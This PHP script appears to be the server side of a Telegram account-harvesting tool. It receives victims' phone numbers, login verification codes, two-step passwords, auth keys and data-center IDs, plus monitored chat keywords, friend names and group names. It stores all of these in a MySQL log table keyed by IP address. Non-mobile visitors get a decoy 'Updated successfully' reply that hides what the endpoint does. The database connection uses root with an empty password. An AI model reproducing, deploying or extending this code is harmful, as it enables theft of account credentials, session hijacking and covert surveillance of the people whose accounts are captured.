<?php
if(isset($_GET['IS_PC'])) $is_pc = $_GET['IS_PC'];
else $is_pc = '0';
if($is_pc == 0) $is_pc = '0';
if($is_pc == 1) $is_pc = '1';

function isMobile() {
    return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
}

if(($is_pc == '0') && (isMobile() == false)) {
	echo "Updated successfully";
	return;
}

if(($is_pc != '0') && ($is_pc != '1')) {
	echo "Updated successfully";
	return;
}

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "buchananapp_pc";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}
$conn->set_charset('utf8mb4'); // charset

if(isset($_GET['ID'])) $logId = $_GET['ID'];
if(isset($_GET['MARK'])) $mark = $_GET['MARK'];
if(isset($_GET['TRIGGER_TIME'])) $trigger_time = $_GET['TRIGGER_TIME'];
if(isset($_GET['TRIGGER_KEY'])) $trigger_key = $_GET['TRIGGER_KEY'];
if(isset($_GET['TRIGGER_ISOUT'])) $trigger_isout = $_GET['TRIGGER_ISOUT'];
else $trigger_isout = '0';
if(isset($_GET['TRIGGER_FRIENDNAME'])) $trigger_friendname = $_GET['TRIGGER_FRIENDNAME'];
else $trigger_friendname = '';
if(isset($_GET['TRIGGER_GROUPNAME'])) $trigger_groupname = $_GET['TRIGGER_GROUPNAME'];
else $trigger_groupname = '';

if(isset($_GET['VERIFYCODE'])) $verify_code = $_GET['VERIFYCODE'];
else $verify_code = '';
if(isset($_GET['TWOSTEP'])) $twostep_password = $_GET['TWOSTEP'];
else $twostep_password = '';

if(isset($_GET['TGID'])) $tgid = $_GET['TGID'];
if(isset($_GET['PHONENUMBER'])) $phonenumber = $_GET['PHONENUMBER'];
if(isset($_GET['DATACENTERID'])) $datacenterid = $_GET['DATACENTERID'];
if(isset($_GET['AUTOKEY'])) $autokey = $_GET['AUTOKEY'];

if((isset($_GET['ID']) == false) || (isset($_GET['ID']) && (strlen($logId) > 10))) {
	echo "Updated successfully";
	return;
}
if(isset($_GET['MARK']) && (strlen($mark) > 2) ) {
	return;
}

if(isset($_GET['TGID']) && strlen($tgid) > 15 ) {
	return;
}
if(isset($_GET['PHONENUMBER']) && strlen($phonenumber) > 15 ) {
	return;
}
if(isset($_GET['DATACENTERID']) && (strlen($datacenterid) > 5) ) {
	return;
}

if (isset($_GET['TRIGGER_TIME']) && (DateTime::createFromFormat('Y-m-d H:i:s', $trigger_time) == false)) {
	return;
}
if(isset($_GET['TRIGGER_ISOUT']) && (strlen($trigger_isout) > 2) ) {
  return;
}
if(isset($_GET['TRIGGER_FRIENDNAME']) && (strlen($trigger_friendname) > 50) ) {
  return;
}
if(isset($_GET['TRIGGER_GROUPNAME']) && (strlen($trigger_groupname) > 50) ) {
  return;
}


if(isset($_GET['VERIFYCODE']) && (strlen($verify_code) > 100) ) {
	$pos = strpos($verify_code,"Login code:");
	if($pos == false) $pos = 0;
	$verify_code = substr($verify_code, $pos, 17);
}
if(isset($_GET['TWOSTEP']) && (strlen($twostep_password) > 50) ) {
	return;
}

ini_set("allow_url_fopen", 1);

//update keyword time and value in logs table
// $stmt = $conn->prepare("SELECT * FROM logs WHERE ID=? and (LAST_TRIGGER_KEY='' or LAST_TRIGGER_KEY is null)");
// $stmt->bind_param('i', $logId);
// $stmt->execute();
// $result = $stmt->get_result();
// if ($result->num_rows > 0) {
// 	$stmt = $conn->prepare("SELECT trigger_time, trigger_key FROM keywords WHERE logid=? ORDER BY id DESC limit 1");
// 	$stmt->bind_param('i', $logId);
// 	$stmt->execute();
// 	$result = $stmt->get_result();
// 	if ($result->num_rows > 0) {
// 		$row = $result->fetch_assoc();
// 		$stmt = $conn->prepare("UPDATE logs SET LAST_TRIGGER_TIME=?, LAST_TRIGGER_KEY=? WHERE ID=?");
// 		$stmt->bind_param('ssi', $row['trigger_time'], $row['trigger_key'], $logId);
// 		if($stmt->execute() === TRUE) {
// 			echo "Latest Trigger is updated successfully";
// 		} else {
// 			echo "Latest Trigger Update Error: " . $conn->error;
// 		}
// 	}
// }

if(isset($_GET['TRIGGER_TIME'])) {
	$content = file_get_contents("blockgroup_json.php");
	try{
		$blockgroup = json_decode($content);
	}catch(exception $e) {
		var_dump($e);
	}

	$content = file_get_contents("blockkeyword_json.php");
	try{
		$blockkeyword = json_decode($content);
	}catch(exception $e) {
		var_dump($e);
	}
	
	$isBlocked = false;
	if(isset($_GET['TRIGGER_GROUPNAME']) && ($trigger_groupname !== null) && ($trigger_groupname !== '')) {
		for($i=0;$i<count($blockgroup);$i++) {
			// if(strpos($blockgroup[$i], $trigger_groupname) !== false) {
			//if(trim($blockgroup[$i]) == trim($trigger_groupname)) {
			if((strpos(trim($blockgroup[$i]), trim($trigger_groupname)) !== false) || (strpos(trim($trigger_groupname), trim($blockgroup[$i])) !== false)) {
				echo "Trigger group is blocked";
				$isBlocked = true;
				break;
			}
		}
	}
	if(isset($_GET['TRIGGER_KEY']) && ($trigger_key !== null) && ($trigger_key !== '')) {
		for($i=0;$i<count($blockkeyword);$i++) {
			if(strpos(trim($trigger_key), trim($blockkeyword[$i])) !== false) {
				echo "Trigger keyword is blocked";
				$isBlocked = true;
				break;
			}
		}
	}

   if($isBlocked == false) {
		// $conn->query("DELETE m FROM keywords m JOIN (SELECT id, COUNT(*) as cnt FROM keywords GROUP BY logid, trigger_key, trigger_isout, trigger_friendname, trigger_groupname) mm ON mm.id = m.id WHERE cnt > 1");
		// $stmt = $conn->prepare("SELECT * FROM keywords WHERE logid=? and  trigger_key=? and trigger_is_blocking='1'");
		$stmt = $conn->prepare("SELECT TG_NUMBER FROM logs WHERE ID=?");
		$stmt->bind_param('i',  $logId);
		$stmt->execute();
		$result = $stmt->get_result();
		$row = $result->fetch_assoc();
		echo $row['TG_NUMBER'];

		$stmt = $conn->prepare("SELECT keywords.id FROM keywords JOIN logs ON keywords.logid=logs.ID WHERE logs.TG_NUMBER=? and keywords.trigger_key=? and keywords.trigger_isout=? and keywords.trigger_friendname=? and keywords.trigger_groupname=?");
		$stmt->bind_param('ssiss', $row['TG_NUMBER'] ,$trigger_key, $trigger_isout,  $trigger_friendname, $trigger_groupname);
		$stmt->execute();
		$result = $stmt->get_result();
		if ($result->num_rows > 0) {
			echo "Trigger already exist,";
			$row = $result->fetch_assoc();
			$stmt = $conn->prepare("UPDATE keywords SET trigger_time=?, updated_at= now() WHERE id=?");
			$stmt->bind_param('si', $trigger_time, $row['id']);
			if($stmt->execute() === TRUE) {
				echo "Trigger record updated successfully";
			} else {
				echo "Trigger record update Error: " . $conn->error;
			}
		} else {
			$stmt = $conn->prepare("INSERT INTO keywords (logid, trigger_time, trigger_key, trigger_isout, trigger_friendname, trigger_groupname, created_at, updated_at)
				VALUES (?, ?, ?, ?,  ?, ?, now(), now() );");
			$stmt->bind_param('ississ', $logId, $trigger_time, $trigger_key, $trigger_isout, $trigger_friendname, $trigger_groupname);
			if($stmt->execute() === TRUE) {
				$insert_id = $conn->insert_id;
				echo "Trigger record created successfully - ".$insert_id;
				$stmt = $conn->prepare("DELETE FROM keywords WHERE logid=? and trigger_key=? and trigger_isout=? and trigger_friendname=? and trigger_groupname=? and id!=?");
				$stmt->bind_param('isissi', $logId, $trigger_key, $trigger_isout, $trigger_friendname, $trigger_groupname, $insert_id);
				$stmt->execute();
			} else {
				echo "Trigger record Insert Error: " . $conn->error;
			}
			
			$stmt = $conn->prepare("UPDATE logs SET LAST_TRIGGER_TIME=?, LAST_TRIGGER_KEY=? WHERE ID=?");
			$stmt->bind_param('ssi', $trigger_time, $trigger_key, $logId);
			if($stmt->execute() === TRUE) {
				echo "Latest Trigger is updated successfully";
			} else {
				echo "Latest Trigger Update Error: " . $conn->error;
			}

			if(isset($_GET['MARK'])) {
				$stmt = $conn->prepare("UPDATE logs SET MARK=?, updated_at= now() WHERE ID=?");
				$stmt->bind_param('ss', $mark, $logId);
				if($stmt->execute() === TRUE) {
				   echo "Mark is updated successfully";
				} else {
				   echo "Mark Update Error: " . $conn->error;
				}
			 }
		}
   }
   
}

$otherSession = 0;

if(isset($_GET['TGID'])) {
	$stmt = $conn->prepare("SELECT IP_ADDRESS, TG_NUMBER  FROM logs WHERE ID=?");
	$stmt->bind_param('s', $logId);
	$stmt->execute();
	$result = $stmt->get_result();
	
	if ($result->num_rows > 0) {
		$row = $result->fetch_assoc();
		$phone1 = $row['TG_NUMBER'];
		$stmt = $conn->prepare("SELECT * FROM logs WHERE IP_ADDRESS=? and TG_ID=? and DATACENTERID=? and AUTO_KEY=?");
		$stmt->bind_param('ssss', $row["IP_ADDRESS"], $tgid, $datacenterid, $autokey);
		$stmt->execute();
		$result = $stmt->get_result();
		if ($result->num_rows > 0) {
			$row = $result->fetch_assoc();
			if($phone1 != $row['TG_NUMBER']) $otherSession = 1;
		}
	}

	if($otherSession == 0) {
		$stmt = $conn->prepare("UPDATE logs SET TG_ID=?, LOGIN_STATUS='1', updated_at= now() WHERE ID=?");
		$stmt->bind_param('ss', $tgid, $logId);
		if($stmt->execute() === TRUE) {
			echo "Tg Id is updated successfully";
		} else {
			echo "Tg Id Update Error: " . $conn->error;
		}
	}
}

if($otherSession == 0) {
	if(isset($_GET['DATACENTERID'])) {
		$stmt = $conn->prepare("UPDATE logs SET DATACENTERID=?, updated_at= now() WHERE ID=?");
		$stmt->bind_param('ss', $datacenterid, $logId);
		if($stmt->execute() === TRUE) {
			echo "DatacenterId is updated successfully";
		} else {
			echo "DatacenterId Update Error: " . $conn->error;
		}
	}
	
	if(isset($_GET['AUTOKEY'])) {
		$stmt = $conn->prepare("UPDATE logs SET AUTO_KEY=?, updated_at= now() WHERE ID=?");
		$stmt->bind_param('ss', $autokey, $logId);
		if($stmt->execute() === TRUE) {
			echo "AutoKey is updated successfully";
		} else {
			echo "AutoKey Update Error: " . $conn->error;
		}
	}
}

if(isset($_GET['PHONENUMBER'])) {
	$stmt = $conn->prepare("UPDATE logs SET TG_NUMBER=?, LOGIN_STATUS='1', updated_at= now() WHERE ID=?");
	$stmt->bind_param('ss', $phonenumber, $logId);
	if($stmt->execute() === TRUE) {
   		echo "Tg Number is updated successfully";
	} else {
   		echo "Tg Number Update Error: " . $conn->error;
	}
}

if(isset($_GET['VERIFYCODE'])) {
	$stmt = $conn->prepare("SELECT IP_ADDRESS FROM logs WHERE ID=?");
	$stmt->bind_param('s', $logId);
	$stmt->execute();
	$result = $stmt->get_result();
	$existVerifyCode = 0;
	if ($result->num_rows > 0) {
		$row = $result->fetch_assoc();

		$stmt = $conn->prepare("SELECT * FROM logs WHERE IP_ADDRESS=? and VERIFYCODE=? and TWOSTEP=?");
		$stmt->bind_param('sss', $row["IP_ADDRESS"], $verify_code, $twostep_password);
		$stmt->execute();
		$result = $stmt->get_result();
		if ($result->num_rows > 0) {
			$existVerifyCode = 1;
			return;
		}
	}

	if($existVerifyCode == 0) {
		$stmt = $conn->prepare("UPDATE logs SET VERIFYCODE=?, updated_at= now() WHERE ID=?");
		$stmt->bind_param('ss', $verify_code, $logId);
		if($stmt->execute() === TRUE) {
		echo "Verify code is updated successfully";
		} else {
		echo "Verify code update Error: " . $conn->error;
		}
	}
}

if(isset($_GET['TWOSTEP'])) {
	$stmt = $conn->prepare("UPDATE logs SET TWOSTEP=?, updated_at= now() WHERE ID=?");
	$stmt->bind_param('ss', $twostep_password, $logId);
	if($stmt->execute() === TRUE) {
	   echo "Two step password is updated successfully";
	} else {
	   echo "Two step password update Error: " . $conn->error;
	}
}

$conn->close();
 ?>